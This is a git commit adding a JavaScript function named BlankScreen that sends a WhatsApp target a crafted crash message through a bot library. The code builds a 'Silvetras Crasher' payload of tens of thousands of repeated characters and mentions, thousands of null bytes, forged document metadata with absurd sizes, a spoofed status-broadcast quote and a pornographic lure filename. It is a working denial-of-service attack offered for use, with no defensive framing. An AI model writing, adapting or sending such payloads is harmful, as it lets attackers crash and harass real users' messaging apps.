bfb4c5e30c877eac86f14b804c820415d945d64f
39135d438fe980e162fc8 <silvetras@gmail.com>
2025-01-26 21:19:41 +0700

    Create BlankScreen.js

---
+++ BlankScreen.js
@@ -0,0 +1,86 @@
+async function BlankScreen(sock, target, Ptcp = false) {
+        let virtex =
+          "Silvetras Crasher͟" + "ꦽ".repeat(45000) + "@13135550002".repeat(50000);
+        await sock.relayMessage(
+          target,
+          {
+            ephemeralMessage: {
+              message: {
+                interactiveMessage: {
+                  header: {
+                    documentMessage: {
+                      url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
+                      mimetype:
+                        "application/vnd.openxmlformats-officedocument.presentationml.presentation",
+                      fileSha256:
+                        "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
+                      fileLength: "9999999999999",
+                      pageCount: 1316134911,
+                      mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
+                      fileName: "Halo🤗",
+                      fileEncSha256:
+                        "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
+                      directPath:
+                        "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
+                      mediaKeyTimestamp: "1726867151",
+                      contactVcard: true,
+                      jpegThumbnail: "https://files.catbox.moe/m33kq5.jpg",
+                    },
+                    hasMediaAttachment: true,
+                  },
+                  body: {
+                    text: virtex,
+                  },
+                  nativeFlowMessage: {
+                    name: "call_permission_request",
+                    messageParamsJson: "\u0000".repeat(5000),
+                  },
+                  contextInfo: {
+                    mentionedJid: ["13135550002@s.whatsapp.net"],
+                    forwardingScore: 1,
+                    isForwarded: true,
+                    fromMe: false,
+                    participant: "0@s.whatsapp.net",
+                    remoteJid: "status@broadcast",
+                    quotedMessage: {
+                      documentMessage: {
+                        url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
+                        mimetype:
+                          "application/vnd.openxmlformats-officedocument.presentationml.presentation",
+                        fileSha256:
+                          "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
+                        fileLength: "9999999999999",
+                        pageCount: 1316134911,
+                        mediaKey:
+                          "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
+                        fileName: "Bokep 18+",
+                        fileEncSha256:
+                          "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
+                        directPath:
+                          "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
+                        mediaKeyTimestamp: "1724474503",
+                        contactVcard: true,
+                        thumbnailDirectPath:
+                          "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
+                        thumbnailSha256:
+                          "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
+                        thumbnailEncSha256:
+                          "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
+                        jpegThumbnail: "https://files.catbox.moe/m33kq5.jpg",
+                      },
+                    },
+                  },
+                },
+              },
+            },
+          },
+          Ptcp
+            ? {
+                participant: {
+                  jid: target,
+                },
+              }
+            : {},
+        );
+        console.log(chalk.red.bold("🌸͜͞𐊢ăŶ͜͝ɯʐʐ🌿"));
+      }
